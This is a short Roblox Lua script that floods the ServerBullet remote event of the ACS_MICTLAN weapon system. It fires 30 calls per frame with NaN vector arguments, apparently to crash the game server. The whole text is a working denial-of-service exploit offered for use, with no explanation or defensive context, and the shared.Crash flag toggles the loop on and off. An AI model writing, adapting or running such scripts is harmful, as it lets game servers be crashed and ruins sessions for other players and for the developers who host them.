local Storage = game:GetService('ReplicatedStorage');
local ACS_Engine = Storage.ACS_MICTLAN;

local Many = 30;
local Remote = ACS_Engine.Events.ServerBullet;

shared.Crash = not shared.Crash;

while shared.Crash do
    for i = 1, Many do
        Remote:FireServer(Vector3.new(0/0/0), Vector3.new(0/0/0));
    end
    task.wait();
end
